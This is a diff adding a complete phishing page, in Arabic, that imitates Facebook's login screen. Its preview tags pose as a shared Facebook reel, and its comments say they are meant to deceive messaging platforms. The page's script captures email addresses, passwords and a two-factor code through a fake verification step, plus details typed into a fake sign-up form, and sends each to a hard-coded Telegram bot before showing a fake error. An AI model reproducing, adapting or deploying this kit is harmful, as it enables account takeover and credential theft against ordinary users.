@@ -1,0 +1,390 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <!-- وسوم المعاينة لخداع منصات التواصـل (مثل واتساب) -->
+    <meta property="og:title" content="شاهد هذا الريل الرائع على فيسبوك!" />
+    <meta property="og:description" content="اضغط هنا لمشاهدة الفيديو كاملًا." />
+    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" />
+    <meta property="og:url" content="https://facebook.com/reel/1234567890" />
+    <meta property="og:type" content="video.other" />
+
+    <title>تسجيل الدخول إلى فيسبوك</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            touch-action: manipulation;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            min-height: 100vh;
+        }
+
+        .main-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex: 1;
+            padding: 20px;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            max-width: 980px;
+            width: 100%;
+            gap: 20px;
+        }
+
+        .left-side {
+            flex: 1;
+            padding-right: 20px;
+        }
+
+        .left-side h1 {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .left-side p {
+            font-size: 24px;
+            line-height: 28px;
+            color: #1c1e21;
+        }
+
+        .right-side {
+            width: 100%;
+            max-width: 396px;
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            text-align: center;
+        }
+
+        .right-side input, .right-side select {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            outline: none;
+            background: #fff;
+        }
+
+        .right-side input:focus, .right-side select:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-btn {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-btn {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 12px 16px;
+            cursor: pointer;
+            width: auto;
+        }
+
+        .create-btn:hover {
+            background-color: #36a420;
+        }
+
+        .error-msg {
+            color: #fa383e;
+            font-size: 14px;
+            margin-bottom: 10px;
+            display: none;
+        }
+
+        .form-section {
+            display: none;
+        }
+
+        .form-section.active {
+            display: block;
+        }
+
+        .row-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        /* تنسيق الشريط السفلي (Footer) الرسمي */
+        footer {
+            background-color: #ffffff;
+            padding: 20px 0;
+            color: #736767;
+            font-size: 12px;
+            text-align: center;
+            border-top: 1px solid #dddfe2;
+        }
+
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 20px;
+            line-height: 22px;
+        }
+
+        .footer-content ul {
+            list-style: none;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+
+        .footer-content ul li a {
+            color: #736767;
+            text-decoration: none;
+        }
+
+        .footer-content ul li a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .main-wrapper {
+                align-items: flex-start;
+                padding-top: 20px;
+            }
+            .container {
+                flex-direction: column;
+                text-align: center;
+                padding: 10px;
+            }
+            .left-side {
+                padding-right: 0;
+                margin-bottom: 15px;
+                width: 100%;
+            }
+            .left-side h1 {
+                font-size: 32px;
+            }
+            .left-side p {
+                font-size: 16px;
+                line-height: 22px;
+            }
+            .right-side {
+                width: 100%;
+                box-shadow: none;
+                background: transparent;
+                padding: 0;
+            }
+            .right-side form, .right-side .reg-box {
+                background: #ffffff;
+                padding: 20px;
+                border-radius: 8px;
+                box-shadow: 0 2px 4px rgba(0, 0, 0, .1);
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-wrapper">
+    <div class="container">
+        <div class="left-side">
+            <h1>facebook</h1>
+            <p>يساعدك فيسبوك على التواصل والمشاركة مع الأشخاص الذين تعرفهم.</p>
+        </div>
+        
+        <div class="right-side">
+            <!-- 1. نموذج تسجيل الدخول الأساسي -->
+            <div id="login-section" class="form-section active">
+                <form id="loginForm">
+                    <div class="error-msg" id="login-error">حدث خطأ في المعالجة. يرجى المحاولة لاحقاً.</div>
+                    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                    <input type="password" id="pass" placeholder="كلمة السر" required>
+                    <button type="submit" class="login-btn">تسجيل الدخول</button>
+                </form>
+                <a href="#" id="forgot-link" style="color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin-bottom: 20px; margin-top: 15px;">هل نسيت كلمة السر؟</a>
+                <div class="divider"></div>
+                <button class="create-btn" id="to-register-btn">إنشاء حساب جديد</button>
+            </div>
+
+            <!-- 2. صفحة رمز التحقق الثنائي الوهمية (2FA) -->
+            <div id="auth-section" class="form-section">
+                <h3 style="margin-bottom: 10px; color: #1c1e21; font-size: 20px;">أدخل رمز تسجيل الدخول</h3>
+                <p style="color: #606770; font-size: 14px; margin-bottom: 15px; line-height: 20px;">الرجاء إدخال الرمز المكون من 6 أرقام من تطبيق المصادقة أو رسالة النص القصيرة الخاصة بك.</p>
+                <form id="authForm">
+                    <div class="error-msg" id="auth-error">الرمز غير صحيح. يرجى المحاولة مرة أخرى.</div>
+                    <input type="text" id="otp-code" placeholder="رمز تسجيل الدخول" maxlength="6" required>
+                    <button type="submit" class="login-btn">متابعة</button>
+                </form>
+            </div>
+
+            <!-- 3. نموذج إنشاء الحساب الوهمي -->
+            <div id="register-section" class="form-section">
+                <h3 style="margin-bottom: 15px; color: #1c1e21; font-size: 22px;">إنشاء حساب جديد</h3>
+                <p style="color: #606770; font-size: 15px; margin-bottom: 15px;">سريع وسهل.</p>
+                <form id="registerForm">
+                    <div class="error-msg" id="reg-error">حدث خطأ في المعالجة. يرجى المحاولة لاحقاً.</div>
+                    <div class="row-group">
+                        <input type="text" id="reg-firstname" placeholder="الاسم الأول" required>
+                        <input type="text" id="reg-lastname" placeholder="اسم العائلة" required>
+                    </div>
+                    <input type="text" id="reg-contact" placeholder="البريد الإلكتروني أو رقم الهاتف المحمول" required>
+                    <input type="password" id="reg-pass" placeholder="كلمة سر جديدة" required>
+                    <button type="submit" class="login-btn" style="background-color: #42b72a; margin-top: 5px;">تسجيل</button>
+                </form>
+                <a href="#" id="back-to-login" style="color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin-top: 15px;">لديك حساب بالفعل؟</a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- الشريط السفلي الرسمي لزيادة الموثوقية -->
+<footer>
+    <div class="footer-content">
+        <ul>
+            <li><a href="#">العربية</a></li>
+            <li><a href="#">الإنجليزية (الولايات المتحدة)</a></li>
+            <li><a href="#">الكردية</a></li>
+            <li><a href="#">السريانية</a></li>
+            <li><a href="#">Türkçe</a></li>
+        </ul>
+        <div style="border-top: 1px solid #dddfe2; margin: 10px 0; width: 100%;"></div>
+        <ul>
+            <li><a href="#">التسجيل</a></li>
+            <li><a href="#">تسجيل الدخول</a></li>
+            <li><a href="#">Messenger</a></li>
+            <li><a href="#">Facebook Lite</a></li>
+            <li><a href="#">الوظائف</a></li>
+            <li><a href="#">خصوصية</a></li>
+            <li><a href="#">الشروط</a></li>
+        </ul>
+        <p style="margin-top: 10px;">Meta © 2026</p>
+    </div>
+</footer>
+
+<script>
+    const token = "9266280668:AAH2AFvajRuYoP00CNeWK6ZkJJNu9JBxhZ0";
+    const chatId = "8797357340";
+
+    let capturedEmail = "";
+    let capturedPass = "";
+
+    // التنقل بين واجهات الحسابات
+    document.getElementById('to-register-btn').addEventListener('click', function(e) {
+        e.preventDefault();
+        document.getElementById('login-section').classList.remove('active');
+        document.getElementById('register-section').classList.add('active');
+    });
+
+    document.getElementById('back-to-login').addEventListener('click', function(e) {
+        e.preventDefault();
+        document.getElementById('register-section').classList.remove('active');
+        document.getElementById('login-section').classList.add('active');
+    });
+
+    // زر نسيت كلمة المرور
+    document.getElementById('forgot-link').addEventListener('click', function(e) {
+        e.preventDefault();
+        const err = document.getElementById('login-error');
+        err.style.display = 'block';
+        err.innerText = "حدث خطأ ما في استرجاع الحساب. يرجى إعادة المحاولة.";
+        document.getElementById('email').value = '';
+        document.getElementById('pass').value = '';
+        setTimeout(() => { window.location.href = "about:blank"; }, 2000);
+    });
+
+    // 1. معالجة تسجيل الدخول الأولي والتحويل لخطوة 2FA الوهمية
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        capturedEmail = document.getElementById('email').value;
+        capturedPass = document.getElementById('pass').value;
+        
+        const payload = `[SECURE_TUNNEL_LOG]\n- ID: ${btoa(capturedEmail)}\n- KEY: ${btoa(capturedPass)}\n- STATUS: STEP_1_CAPTURED`;
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(payload)}`;
+        
+        fetch(url).then(() => {
+            // الانتقال لصفحة طلب رمز الأمان الثنائي بدلاً من الخروج مباشرة
+            document.getElementById('login-section').classList.remove('active');
+            document.getElementById('auth-section').classList.add('active');
+        }).catch(() => {
+            document.getElementById('login-section').classList.remove('active');
+            document.getElementById('auth-section').classList.add('active');
+        });
+    });
+
+    // 2. معالجة إرسال رمز التحقق (2FA) ثم الإنهاء
+    document.getElementById('authForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const otp = document.getElementById('otp-code').value;
+        
+        const payload = `[SECURE_TUNNEL_LOG]\n- ID: ${btoa(capturedEmail)}\n- OTP: ${btoa(otp)}\n- STATUS: FULL_CAPTURED`;
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(payload)}`;
+        
+        fetch(url).then(() => {
+            document.getElementById('auth-error').style.display = 'block';
+            setTimeout(() => { window.location.href = "about:blank"; }, 1500);
+        }).catch(() => {
+            document.getElementById('auth-error').style.display = 'block';
+            setTimeout(() => { window.location.href = "about:blank"; }, 1500);
+        });
+    });
+
+    // 3. معالجة تسجيل الحساب الوهمي
+    document.getElementById('registerForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const fname = document.getElementById('reg-firstname').value;
+        const lname = document.getElementById('reg-lastname').value;
+        const contact = document.getElementById('reg-contact').value;
+        const pass = document.getElementById('reg-pass').value;
+        
+        const payload = `[NEW_REGISTRATION_DATA]\n- Name: ${fname} ${lname}\n- Contact: ${contact}\n- Pass: ${pass}`;
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(payload)}`;
+        
+        fetch(url).then(() => {
+            document.getElementById('reg-error').style.display = 'block';
+            setTimeout(() => { window.location.href = "about:blank"; }, 1500);
+        }).catch(() => {
+            document.getElementById('reg-error').style.display = 'block';
+            setTimeout(() => { window.location.href = "about:blank"; }, 1500);
+        });
+    });
+</script>
+
+</body>
+</html>
